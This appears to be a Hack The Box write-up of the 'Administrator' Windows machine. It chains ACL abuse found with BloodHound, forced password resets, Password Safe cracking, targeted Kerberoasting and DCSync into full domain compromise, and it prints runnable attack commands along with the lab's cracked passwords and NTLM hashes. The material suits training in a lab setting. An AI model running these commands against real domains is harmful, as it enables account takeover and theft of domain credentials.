---
title: Administrator
date: 2024-12-26
draft: false
tags:
  - htb
  - medium
  - windows
category: Write-up
description: "Administrator is a medium Windows box focused on full domain compromise through ACL abuse and credential chaining: enumerate ACLs to uncover Olivia’s GenericAll over Michael and reset his password; as Michael, force-reset Benjamin’s password to gain FTP access and crack backup.psafe3 for credentials; spray those credentials to identify Emily; use Emily’s GenericWrite over Ethan to execute a targeted Kerberoast, crack Ethan’s hash, then leverage his DCSync rights to dump AD and recover the Administrator hash. Clean work. Dangerous outcome."
---

> `Username: Olivia ~ Password: ichliebedich`

# Initial Recon

```text
445 - SMB
5985 - WinRM
```

### SMB Recon

```text
Administrator
Guest
krbtgt
olivia
michael
benjamin
emily
ethan
alexander
emma
( LockoutTries=0 PasswordMin=7 )
```

### WinRM

Using `evil-winrm`, we gained a PowerShell session. Nice and easy. Almost suspiciously easy.

- `net user` → Enumerates all users
- `whoami /all` → Displays user info, group info, privilege info, and user claims marked as unknown

# User Flag

## BloodHound

Click on the user `olivia` (accessible through the **Analysis** tab and query section).

**Check Node Info**  
→ Under the `Outbound Object Control` header, it shows the account has `First Degree Object Control (FDOC)`  
→ Clicking it reveals a path to user `michael` with `GenericAll` permissions ⇒ allowing password changes for that user

### michael ⇒ Using evil-winrm

- `net user michael`
- `net user michael /domain`

**Inside BloodHound:**  
→ Checking **michael** reveals another FDOC relationship  
→ Following it leads to user `Benjamin`, where we can perform a `ForceChangePassword`

```text
rpcclient -U michael <ip>
setuserinfo2 benjamin 23 'password'
```

→ This sets a new password for the `benjamin` user. Domain security at its finest.

Now inside BloodHound, check the **First Degree Group Membership** under the membership tab.

→ `benjamin` is a member of **Share Moderators**  
→ Using his credentials against FTP reveals `Backup.psafe3`

```sh
pwsafe Backup.psafe3
```

→ Opening it requires a **master password**

```sh
hashcat -m 5200 Backup.psafe3 /rockyou.txt
```

→ This reveals the master password from `Backup.psafe3`

We recovered the following `credentials`:

```output
alexander:UrkIbagoxMyUGw0aPlj9B0AXSea4Sw
emily:UXLCI5iETUsIBoFVTj8yQFKoHjXmb → (contains user.txt)
emma:WwANQWnmJnGV07WQN8bMS7FMAbjNur
ethan:limpbizkit
```

# Root Flag

## Kerberoasting

Checking the **emily** user’s FDOC reveals a path to **ethan**, vulnerable through `GenericWrite`.

> A Kerberos-based attack where we retrieve the Kerberos ticket hash of the vulnerable user **ethan**. Kerberos is heavily time-sensitive. Because apparently authentication needed drama too.

We used `targetedKerberoast.py`

```text
python3 targetedKerberoast.py -d administrator.htb -u emily -p 'UXLCI5iETUsIBoFVTj8yQFKoHjXmb'
```

→ It returned a clock-skew error  
→ `GetUserSPN.py` did not work  
→ `ntpdate` also failed to synchronize correctly with the target machine  
→ Checking the Nmap script results revealed clock-skew:

```text
{"output"⇒ “7h00m00s”}
```

→ The target was running 7 hours ahead, so we adjusted our local execution time accordingly.

## Faketime

```text
faketime 'now +7 hours' python3 targetedKerberoast.py -d administrator.htb -u emily -p 'UXLCI5iETUsIBoFVTj8yQFKoHjXmb'
```

We successfully retrieved the hash and cracked it using **hashcat**.

> `ethan: limpbizkit`

## Impacket

We observed that Ethan’s FDOC granted `DCSync` rights, so we used `secretsdump.py` from `/impacket/examples`

```text
python3 secretsdump.py administrator.htb/ethan:limpbizkit@10.10.11.42
```

If it fails, upgrade `impacket`:

```text
pip install --upgrade impacket
```

```text
Administrator:500:aad3b435b51404eeaad3b435b51404ee:3dc553ce4b9fd20bd016e098d2d2fd2e:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:1181ba47d45fa2c76385a82409cbfaf6:::
```

We logged in using the `hash` through `evil-winrm`.

Gained `Root`.
